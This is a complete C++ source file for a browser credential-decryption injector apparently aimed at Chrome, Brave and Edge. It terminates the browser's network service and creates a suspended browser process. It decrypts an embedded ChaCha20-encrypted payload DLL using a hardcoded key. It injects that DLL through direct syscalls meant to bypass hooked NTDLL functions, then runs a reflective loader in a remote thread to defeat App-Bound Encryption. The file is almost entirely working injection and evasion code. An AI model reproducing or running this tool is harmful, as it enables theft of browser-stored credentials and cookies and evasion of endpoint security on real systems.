// chrome_inject.cpp
// v0.14.2 (c) Alexander 'xaitax' Hagenah
// Licensed under the MIT License. See LICENSE file in the project root for full license information.

#include <Windows.h>
#include <Rpc.h>
#include <iostream>
#include <string>
#include <vector>
#include <sstream>
#include <iomanip>
#include <filesystem>
#include <optional>
#include <map>
#include <memory>
#include <stdexcept>
#include <cstdint>
#include <algorithm>

#include "syscalls.h"
#define CHACHA20_IMPLEMENTATION
#include "..\libs\chacha\chacha20.h"

#pragma comment(lib, "Rpcrt4.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "version.lib")
#pragma comment(lib, "user32.lib")

#ifndef IMAGE_FILE_MACHINE_AMD64
#define IMAGE_FILE_MACHINE_AMD64 0x8664
#endif
#ifndef IMAGE_FILE_MACHINE_ARM64
#define IMAGE_FILE_MACHINE_ARM64 0xAA64
#endif

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

namespace
{
    constexpr DWORD DLL_COMPLETION_TIMEOUT_MS = 60000;

    const uint8_t g_decryptionKey[32] = {
        0x1B, 0x27, 0x55, 0x64, 0x73, 0x8B, 0x9F, 0x4D,
        0x58, 0x4A, 0x7D, 0x67, 0x8C, 0x79, 0x77, 0x46,
        0xBE, 0x6B, 0x4E, 0x0C, 0x54, 0x57, 0xCD, 0x95,
        0x18, 0xDE, 0x7E, 0x21, 0x47, 0x66, 0x7C, 0x94};

    const uint8_t g_decryptionNonce[12] = {
        0x4A, 0x51, 0x78, 0x62, 0x8D, 0x2D, 0x4A, 0x54,
        0x88, 0xE5, 0x3C, 0x50};

    namespace fs = std::filesystem;

    struct HandleDeleter
    {
        void operator()(HANDLE h) const
        {
            if (h && h != INVALID_HANDLE_VALUE)
                CloseHandle(h);
        }
    };
    using UniqueHandle = std::unique_ptr<void, HandleDeleter>;

    namespace Utils
    {
        std::string WStringToUtf8(std::wstring_view w_sv)
        {
            if (w_sv.empty())
                return {};
            int size_needed = WideCharToMultiByte(CP_UTF8, 0, w_sv.data(), static_cast<int>(w_sv.length()), nullptr, 0, nullptr, nullptr);
            std::string utf8_str(size_needed, '\0');
            WideCharToMultiByte(CP_UTF8, 0, w_sv.data(), static_cast<int>(w_sv.length()), &utf8_str[0], size_needed, nullptr, nullptr);
            return utf8_str;
        }

        std::string PtrToHexStr(const void *ptr)
        {
            std::ostringstream oss;
            oss << "0x" << std::hex << reinterpret_cast<uintptr_t>(ptr);
            return oss.str();
        }

        std::string NtStatusToString(NTSTATUS status)
        {
            std::ostringstream oss;
            oss << "0x" << std::hex << status;
            return oss.str();
        }

        std::wstring GenerateUniquePipeName()
        {
            UUID uuid;
            UuidCreate(&uuid);
            wchar_t *uuidStrRaw = nullptr;
            UuidToStringW(&uuid, (RPC_WSTR *)&uuidStrRaw);
            std::wstring pipeName = L"\\\\.\\pipe\\" + std::wstring(uuidStrRaw);
            RpcStringFreeW((RPC_WSTR *)&uuidStrRaw);
            return pipeName;
        }
    }
}

class Console
{
public:
    explicit Console(bool verbose) : m_verbose(verbose), m_hConsole(GetStdHandle(STD_OUTPUT_HANDLE))
    {
        CONSOLE_SCREEN_BUFFER_INFO consoleInfo;
        GetConsoleScreenBufferInfo(m_hConsole, &consoleInfo);
        m_originalAttributes = consoleInfo.wAttributes;
    }

    void displayBanner() const
    {
        SetColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
        std::cout << "------------------------------------------------\n"
                  << "|  Chrome App-Bound Encryption Decryption      |\n"
                  << "|  Direct Syscall-Based Reflective Hollowing   |\n"
                  << "|  x64 & ARM64 | v0.14.1 by @xaitax            |\n"
                  << "------------------------------------------------\n\n";
        ResetColor();
    }

    void printUsage() const
    {
        SetColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY);
        std::wcout << L"Usage:\n"
                   << L"  chrome_inject.exe [options] <chrome|brave|edge>\n\n"
                   << L"Options:\n"
                   << L"  --output-path|-o <path>  Directory for output files (default: .\\output\\)\n"
                   << L"  --verbose|-v             Enable verbose debug output from the injector\n"
                   << L"  --help|-h                Show this help message\n";
        ResetColor();
    }

    void Info(const std::string &msg) const { print("[*]", msg, FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_INTENSITY); }
    void Success(const std::string &msg) const { print("[+]", msg, FOREGROUND_GREEN | FOREGROUND_INTENSITY); }
    void Error(const std::string &msg) const { print("[-]", msg, FOREGROUND_RED | FOREGROUND_INTENSITY); }
    void Warn(const std::string &msg) const { print("[!]", msg, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY); }
    void Debug(const std::string &msg) const
    {
        if (m_verbose)
            print("[#]", msg, FOREGROUND_RED | FOREGROUND_GREEN);
    }

    void Relay(const std::string &message) const
    {
        size_t tagStart = message.find('[');
        size_t tagEnd = message.find(']', tagStart);
        if (tagStart != std::string::npos && tagEnd != std::string::npos)
        {
            std::cout << message.substr(0, tagStart);
            std::string tag = message.substr(tagStart, tagEnd - tagStart + 1);
            WORD color = m_originalAttributes;
            if (tag == "[+]")
                color = FOREGROUND_GREEN | FOREGROUND_INTENSITY;
            else if (tag == "[-]")
                color = FOREGROUND_RED | FOREGROUND_INTENSITY;
            else if (tag == "[*]")
                color = FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_INTENSITY;
            else if (tag == "[!]")
                color = FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY;
            SetColor(color);
            std::cout << tag;
            ResetColor();
            std::cout << message.substr(tagEnd + 1) << std::endl;
        }
        else
        {
            std::cout << message << std::endl;
        }
    }

private:
    void print(const std::string &tag, const std::string &msg, WORD color) const
    {
        SetColor(color);
        std::cout << tag;
        ResetColor();
        std::cout << " " << msg << std::endl;
    }
    void SetColor(WORD attributes) const { SetConsoleTextAttribute(m_hConsole, attributes); }
    void ResetColor() const { SetConsoleTextAttribute(m_hConsole, m_originalAttributes); }

    bool m_verbose;
    HANDLE m_hConsole;
    WORD m_originalAttributes;
};

struct Configuration
{
    bool verbose = false;
    fs::path outputPath;
    std::wstring browserType;
    std::wstring browserProcessName;
    std::wstring browserDefaultExePath;
    std::string browserDisplayName;

    [[nodiscard]] static std::optional<Configuration> CreateFromArgs(int argc, wchar_t *argv[], const Console &console)
    {
        Configuration config;
        fs::path customOutputPath;

        for (int i = 1; i < argc; ++i)
        {
            std::wstring_view arg = argv[i];
            if (arg == L"--verbose" || arg == L"-v")
                config.verbose = true;
            else if ((arg == L"--output-path" || arg == L"-o") && i + 1 < argc)
                customOutputPath = argv[++i];
            else if (arg == L"--help" || arg == L"-h")
            {
                console.printUsage();
                return std::nullopt;
            }
            else if (config.browserType.empty() && !arg.empty() && arg[0] != L'-')
                config.browserType = arg;
            else
            {
                console.Warn("Unknown or misplaced argument: " + Utils::WStringToUtf8(arg));
                return std::nullopt;
            }
        }

        if (config.browserType.empty())
        {
            console.printUsage();
            return std::nullopt;
        }
        std::transform(config.browserType.begin(), config.browserType.end(), config.browserType.begin(), ::towlower);

        static const std::map<std::wstring, std::pair<std::wstring, std::wstring>> browserMap = {
            {L"chrome", {L"chrome.exe", L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"}},
            {L"brave", {L"brave.exe", L"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"}},
            {L"edge", {L"msedge.exe", L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"}}};

        auto it = browserMap.find(config.browserType);
        if (it == browserMap.end())
        {
            console.Error("Unsupported browser type: " + Utils::WStringToUtf8(config.browserType));
            return std::nullopt;
        }

        config.browserProcessName = it->second.first;
        config.browserDefaultExePath = it->second.second;

        std::string displayName = Utils::WStringToUtf8(config.browserType);
        if (!displayName.empty())
        {
            displayName[0] = static_cast<char>(std::toupper(static_cast<unsigned char>(displayName[0])));
        }
        config.browserDisplayName = displayName;

        config.outputPath = customOutputPath.empty() ? fs::current_path() / "output" : fs::absolute(customOutputPath);

        return config;
    }
};

class TargetProcess
{
public:
    TargetProcess(const Configuration &config, const Console &console) : m_config(config), m_console(console) {}

    void createSuspended()
    {
        m_console.Info("Creating suspended " + m_config.browserDisplayName + " process.");
        m_console.Debug("Target executable path: " + Utils::WStringToUtf8(m_config.browserDefaultExePath));

        STARTUPINFOW si{};
        PROCESS_INFORMATION pi{};
        si.cb = sizeof(si);

        if (!CreateProcessW(
                m_config.browserDefaultExePath.c_str(), nullptr,
                nullptr, nullptr, FALSE, CREATE_SUSPENDED,
                nullptr, nullptr, &si, &pi))
        {
            throw std::runtime_error("CreateProcessW failed. Error: " + std::to_string(GetLastError()));
        }

        m_hProcess.reset(pi.hProcess);
        m_hThread.reset(pi.hThread);
        m_pid = pi.dwProcessId;

        m_console.Success("Created suspended process PID: " + std::to_string(m_pid));
        checkArchitecture();
    }

    void terminate()
    {
        if (m_hProcess)
        {
            m_console.Debug("Terminating browser PID=" + std::to_string(m_pid) + " via direct syscall.");
            NtTerminateProcess_syscall(m_hProcess.get(), 0);
            m_console.Info(m_config.browserDisplayName + " terminated by injector.");
        }
    }

    HANDLE getProcessHandle() const { return m_hProcess.get(); }
    USHORT getArch() const { return m_arch; }

private:
    void checkArchitecture()
    {
        USHORT processArch = 0, nativeMachine = 0;
        auto fnIsWow64Process2 = (decltype(&IsWow64Process2))GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "IsWow64Process2");
        if (!fnIsWow64Process2 || !fnIsWow64Process2(m_hProcess.get(), &processArch, &nativeMachine))
        {
            throw std::runtime_error("Failed to determine target process architecture.");
        }

        m_arch = (processArch == IMAGE_FILE_MACHINE_UNKNOWN) ? nativeMachine : processArch;

        constexpr USHORT injectorArch =
#if defined(_M_X64)
            IMAGE_FILE_MACHINE_AMD64;
#elif defined(_M_ARM64)
            IMAGE_FILE_MACHINE_ARM64;
#else
            IMAGE_FILE_MACHINE_UNKNOWN;
#endif

        if (m_arch != injectorArch)
        {
            throw std::runtime_error("Architecture mismatch. Injector is " + std::string(getArchName(injectorArch)) + " but target is " + std::string(getArchName(m_arch)));
        }
        m_console.Debug("Architecture match: Injector=" + std::string(getArchName(injectorArch)) + ", Target=" + std::string(getArchName(m_arch)));
    }

    const char *getArchName(USHORT arch) const
    {
        switch (arch)
        {
        case IMAGE_FILE_MACHINE_AMD64:
            return "x64";
        case IMAGE_FILE_MACHINE_ARM64:
            return "ARM64";
        case IMAGE_FILE_MACHINE_I386:
            return "x86";
        default:
            return "Unknown";
        }
    }

    const Configuration &m_config;
    const Console &m_console;
    DWORD m_pid = 0;
    UniqueHandle m_hProcess;
    UniqueHandle m_hThread;
    USHORT m_arch = 0;
};

class PipeCommunicator
{
public:
    PipeCommunicator(const std::wstring &pipeName, const Console &console) : m_pipeName(pipeName), m_console(console) {}

    void create()
    {
        m_pipeHandle.reset(CreateNamedPipeW(m_pipeName.c_str(), PIPE_ACCESS_DUPLEX,
                                            PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
                                            1, 4096, 4096, 0, nullptr));
        if (!m_pipeHandle)
        {
            throw std::runtime_error("CreateNamedPipeW failed. Error: " + std::to_string(GetLastError()));
        }
        m_console.Debug("Named pipe server created: " + Utils::WStringToUtf8(m_pipeName));
    }

    void waitForClient()
    {
        m_console.Debug("Waiting for payload to connect to named pipe.");
        if (!ConnectNamedPipe(m_pipeHandle.get(), nullptr) && GetLastError() != ERROR_PIPE_CONNECTED)
        {
            throw std::runtime_error("ConnectNamedPipe failed. Error: " + std::to_string(GetLastError()));
        }
        m_console.Debug("Payload connected to named pipe.");
    }

    void sendInitialData(bool isVerbose, const fs::path &outputPath)
    {
        writeMessage(isVerbose ? "VERBOSE_TRUE" : "VERBOSE_FALSE");
        writeMessage(outputPath.u8string());
    }

    void relayMessages()
    {
        m_console.Info("Waiting for payload execution. (Pipe: " + Utils::WStringToUtf8(m_pipeName) + ")");
        std::cout << std::endl;

        const std::string dllCompletionSignal = "__DLL_PIPE_COMPLETION_SIGNAL__";
        DWORD startTime = GetTickCount();
        std::string accumulatedData;
        char buffer[4096];
        bool completed = false;

        while (!completed && (GetTickCount() - startTime < DLL_COMPLETION_TIMEOUT_MS))
        {
            DWORD bytesAvailable = 0;
            if (!PeekNamedPipe(m_pipeHandle.get(), nullptr, 0, nullptr, &bytesAvailable, nullptr))
            {
                if (GetLastError() == ERROR_BROKEN_PIPE)
                    break;
                m_console.Error("PeekNamedPipe failed. Error: " + std::to_string(GetLastError()));
                break;
            }
            if (bytesAvailable == 0)
            {
                Sleep(100);
                continue;
            }

            DWORD bytesRead = 0;
            if (!ReadFile(m_pipeHandle.get(), buffer, sizeof(buffer) - 1, &bytesRead, nullptr) || bytesRead == 0)
            {
                if (GetLastError() == ERROR_BROKEN_PIPE)
                    break;
                continue;
            }

            accumulatedData.append(buffer, bytesRead);

            size_t messageStart = 0;
            size_t nullPos;
            while ((nullPos = accumulatedData.find('\0', messageStart)) != std::string::npos)
            {
                std::string message = accumulatedData.substr(messageStart, nullPos - messageStart);
                messageStart = nullPos + 1;

                if (message == dllCompletionSignal)
                {
                    m_console.Debug("Payload completion signal received.");
                    completed = true;
                    break;
                }
                if (!message.empty())
                    m_console.Relay(message);
            }
            if (completed)
                break;
            accumulatedData.erase(0, messageStart);
        }
        std::cout << std::endl;
        m_console.Success("Payload signaled completion or pipe interaction ended.");
    }

    const std::wstring &getName() const { return m_pipeName; }

private:
    void writeMessage(const std::string &msg)
    {
        DWORD bytesWritten = 0;
        if (!WriteFile(m_pipeHandle.get(), msg.c_str(), static_cast<DWORD>(msg.length() + 1), &bytesWritten, nullptr) ||
            bytesWritten != (msg.length() + 1))
        {
            throw std::runtime_error("WriteFile to pipe failed for message: " + msg);
        }
        m_console.Debug("Sent message to pipe: " + msg);
    }

    std::wstring m_pipeName;
    const Console &m_console;
    UniqueHandle m_pipeHandle;
};

class InjectionManager
{
public:
    InjectionManager(TargetProcess &target, const Console &console)
        : m_target(target), m_console(console) {}

    void execute(const std::wstring &pipeName)
    {
        m_console.Debug("Loading and decrypting payload DLL.");
        loadAndDecryptPayload();

        m_console.Debug("Parsing payload PE headers for ReflectiveLoader.");
        DWORD rdiOffset = getReflectiveLoaderOffset();
        if (rdiOffset == 0)
            throw std::runtime_error("Could not find ReflectiveLoader export in payload.");
        m_console.Debug("ReflectiveLoader found at file offset: " + Utils::PtrToHexStr((void *)(uintptr_t)rdiOffset));

        m_console.Debug("Allocating memory for payload in target process.");
        PVOID remoteDllBase = nullptr;
        SIZE_T payloadDllSize = m_decryptedDllPayload.size();
        SIZE_T pipeNameByteSize = (pipeName.length() + 1) * sizeof(wchar_t);
        SIZE_T totalAllocationSize = payloadDllSize + pipeNameByteSize;

        NTSTATUS status = NtAllocateVirtualMemory_syscall(m_target.getProcessHandle(), &remoteDllBase, 0, &totalAllocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!NT_SUCCESS(status))
            throw std::runtime_error("NtAllocateVirtualMemory failed: " + Utils::NtStatusToString(status));
        m_console.Debug("Combined memory for payload and parameters allocated at: " + Utils::PtrToHexStr(remoteDllBase));

        m_console.Debug("Writing payload DLL to target process.");
        SIZE_T bytesWritten = 0;
        status = NtWriteVirtualMemory_syscall(m_target.getProcessHandle(), remoteDllBase, m_decryptedDllPayload.data(), payloadDllSize, &bytesWritten);
        if (!NT_SUCCESS(status))
            throw std::runtime_error("NtWriteVirtualMemory for payload DLL failed: " + Utils::NtStatusToString(status));

        m_console.Debug("Writing pipe name parameter into the same allocation.");
        LPVOID remotePipeNameAddr = reinterpret_cast<PBYTE>(remoteDllBase) + payloadDllSize;
        status = NtWriteVirtualMemory_syscall(m_target.getProcessHandle(), remotePipeNameAddr, (PVOID)pipeName.c_str(), pipeNameByteSize, &bytesWritten);
        if (!NT_SUCCESS(status))
            throw std::runtime_error("NtWriteVirtualMemory for pipe name failed: " + Utils::NtStatusToString(status));

        m_console.Debug("Changing payload memory protection to executable.");
        ULONG oldProtect = 0;
        status = NtProtectVirtualMemory_syscall(m_target.getProcessHandle(), &remoteDllBase, &totalAllocationSize, PAGE_EXECUTE_READ, &oldProtect);
        if (!NT_SUCCESS(status))
            throw std::runtime_error("NtProtectVirtualMemory failed: " + Utils::NtStatusToString(status));

        startHijackedThreadInTarget(remoteDllBase, rdiOffset, remotePipeNameAddr);

        m_console.Success("New thread created for payload. Main thread remains suspended.");
    }

private:
    void loadAndDecryptPayload()
    {
        HMODULE hModule = GetModuleHandle(NULL);
        HRSRC hResInfo = FindResourceW(hModule, L"PAYLOAD_DLL", MAKEINTRESOURCEW(10));
        if (!hResInfo)
            throw std::runtime_error("FindResource failed. Error: " + std::to_string(GetLastError()));
        HGLOBAL hResData = LoadResource(hModule, hResInfo);
        if (!hResData)
            throw std::runtime_error("LoadResource failed. Error: " + std::to_string(GetLastError()));
        LPVOID pData = LockResource(hResData);
        DWORD dwSize = SizeofResource(hModule, hResInfo);
        if (!pData || dwSize == 0)
            throw std::runtime_error("LockResource or SizeofResource failed.");

        m_decryptedDllPayload.assign((BYTE *)pData, (BYTE *)pData + dwSize);
        chacha20_xor(g_decryptionKey, g_decryptionNonce, m_decryptedDllPayload.data(), m_decryptedDllPayload.size(), 0);
    }

    DWORD getReflectiveLoaderOffset()
    {
        auto dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(m_decryptedDllPayload.data());
        if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE)
            return 0;

        auto ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>((uintptr_t)m_decryptedDllPayload.data() + dosHeader->e_lfanew);
        if (ntHeaders->Signature != IMAGE_NT_SIGNATURE)
            return 0;

        auto exportDirRva = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        if (exportDirRva == 0)
            return 0;

        auto RvaToOffset = [&](DWORD rva) -> PVOID
        {
            PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
            for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i, ++section)
            {
                if (rva >= section->VirtualAddress && rva < section->VirtualAddress + section->Misc.VirtualSize)
                {
                    return (PVOID)((uintptr_t)m_decryptedDllPayload.data() + section->PointerToRawData + (rva - section->VirtualAddress));
                }
            }
            return nullptr;
        };

        auto exportDir = (PIMAGE_EXPORT_DIRECTORY)RvaToOffset(exportDirRva);
        if (!exportDir)
            return 0;

        auto names = (PDWORD)RvaToOffset(exportDir->AddressOfNames);
        auto ordinals = (PWORD)RvaToOffset(exportDir->AddressOfNameOrdinals);
        auto funcs = (PDWORD)RvaToOffset(exportDir->AddressOfFunctions);
        if (!names || !ordinals || !funcs)
            return 0;

        for (DWORD i = 0; i < exportDir->NumberOfNames; ++i)
        {
            char *funcName = (char *)RvaToOffset(names[i]);
            if (funcName && strcmp(funcName, "ReflectiveLoader") == 0)
            {
                PVOID funcOffsetPtr = RvaToOffset(funcs[ordinals[i]]);
                if (!funcOffsetPtr)
                    return 0;
                return (DWORD)((uintptr_t)funcOffsetPtr - (uintptr_t)m_decryptedDllPayload.data());
            }
        }
        return 0;
    }

    void startHijackedThreadInTarget(PVOID remoteDllBase, DWORD rdiOffset, PVOID remotePipeNameAddr)
    {
        m_console.Debug("Creating new thread in target to execute ReflectiveLoader.");

        uintptr_t entryPoint = reinterpret_cast<uintptr_t>(remoteDllBase) + rdiOffset;
        HANDLE hRemoteThread = nullptr;

        NTSTATUS status = NtCreateThreadEx_syscall(&hRemoteThread, THREAD_ALL_ACCESS, nullptr, m_target.getProcessHandle(),
                                                   (LPTHREAD_START_ROUTINE)entryPoint, remotePipeNameAddr, 0, 0, 0, 0, nullptr);

        UniqueHandle remoteThreadGuard(hRemoteThread);

        if (!NT_SUCCESS(status))
        {
            throw std::runtime_error("NtCreateThreadEx failed: " + Utils::NtStatusToString(status));
        }

        m_console.Debug("Successfully created new thread for payload.");
    }

    TargetProcess &m_target;
    const Console &m_console;
    std::vector<BYTE> m_decryptedDllPayload;
};

void KillBrowserNetworkService(const Configuration &config, const Console &console)
{
    console.Info("Scanning for and terminating browser network services...");

    UniqueHandle hCurrentProc;
    HANDLE nextProcHandle = nullptr;
    int processes_terminated = 0;

    while (NT_SUCCESS(NtGetNextProcess_syscall(hCurrentProc.get(), PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_TERMINATE, 0, 0, &nextProcHandle)))
    {
        UniqueHandle hNextProc(nextProcHandle);
        hCurrentProc = std::move(hNextProc);

        std::vector<BYTE> buffer(sizeof(UNICODE_STRING_SYSCALLS) + MAX_PATH * 2);
        auto imageName = reinterpret_cast<PUNICODE_STRING_SYSCALLS>(buffer.data());
        if (!NT_SUCCESS(NtQueryInformationProcess_syscall(hCurrentProc.get(), ProcessImageFileName, imageName, (ULONG)buffer.size(), NULL)) || imageName->Length == 0)
            continue;

        fs::path p(std::wstring(imageName->Buffer, imageName->Length / sizeof(wchar_t)));
        if (_wcsicmp(p.filename().c_str(), config.browserProcessName.c_str()) != 0)
            continue;

        PROCESS_BASIC_INFORMATION pbi{};
        if (!NT_SUCCESS(NtQueryInformationProcess_syscall(hCurrentProc.get(), ProcessBasicInformation, &pbi, sizeof(pbi), nullptr)) || !pbi.PebBaseAddress)
            continue;

        PEB peb{};
        if (!NT_SUCCESS(NtReadVirtualMemory_syscall(hCurrentProc.get(), pbi.PebBaseAddress, &peb, sizeof(peb), nullptr)))
            continue;
        RTL_USER_PROCESS_PARAMETERS params{};
        if (!NT_SUCCESS(NtReadVirtualMemory_syscall(hCurrentProc.get(), peb.ProcessParameters, &params, sizeof(params), nullptr)))
            continue;

        std::vector<wchar_t> cmdLine(params.CommandLine.Length / sizeof(wchar_t) + 1, 0);
        if (params.CommandLine.Length > 0 && !NT_SUCCESS(NtReadVirtualMemory_syscall(hCurrentProc.get(), params.CommandLine.Buffer, cmdLine.data(), params.CommandLine.Length, nullptr)))
            continue;

        if (wcsstr(cmdLine.data(), L"--utility-sub-type=network.mojom.NetworkService"))
        {
            console.Success("Found and terminated network service PID: " + std::to_string((DWORD)pbi.UniqueProcessId));
            NtTerminateProcess_syscall(hCurrentProc.get(), 0);
            processes_terminated++;
        }
    }

    if (processes_terminated > 0)
    {
        console.Info("Termination sweep complete. Waiting for file locks to fully release.");
        Sleep(1500);
    }
}

void RunInjectionWorkflow(const Configuration &config, const Console &console)
{
    KillBrowserNetworkService(config, console);

    TargetProcess target(config, console);
    target.createSuspended();

    PipeCommunicator pipe(Utils::GenerateUniquePipeName(), console);
    pipe.create();

    InjectionManager injector(target, console);
    injector.execute(pipe.getName());

    pipe.waitForClient();
    pipe.sendInitialData(config.verbose, config.outputPath);
    pipe.relayMessages();

    target.terminate();
}

int wmain(int argc, wchar_t *argv[])
{
    bool isVerbose = false;
    for (int i = 1; i < argc; ++i)
    {
        if (std::wstring_view(argv[i]) == L"--verbose" || std::wstring_view(argv[i]) == L"-v")
        {
            isVerbose = true;
            break;
        }
    }
    Console console(isVerbose);
    console.displayBanner();

    auto optConfig = Configuration::CreateFromArgs(argc, argv, console);
    if (!optConfig)
    {
        return (argc > 1 && (std::wstring_view(argv[1]) == L"--help" || std::wstring_view(argv[1]) == L"-h")) ? 0 : 1;
    }

    if (!InitializeSyscalls(optConfig->verbose))
    {
        console.Error("Failed to initialize direct syscalls. Critical NTDLL functions might be hooked or gadgets not found.");
        return 1;
    }

    std::error_code ec;
    fs::create_directories(optConfig->outputPath, ec);
    if (ec)
    {
        console.Error("Failed to create output directory: " + optConfig->outputPath.u8string() + ". Error: " + ec.message());
        return 1;
    }

    try
    {
        RunInjectionWorkflow(*optConfig, console);
    }
    catch (const std::runtime_error &e)
    {
        console.Error(e.what());
        return 1;
    }

    console.Debug("Injector finished successfully.");
    return 0;
}
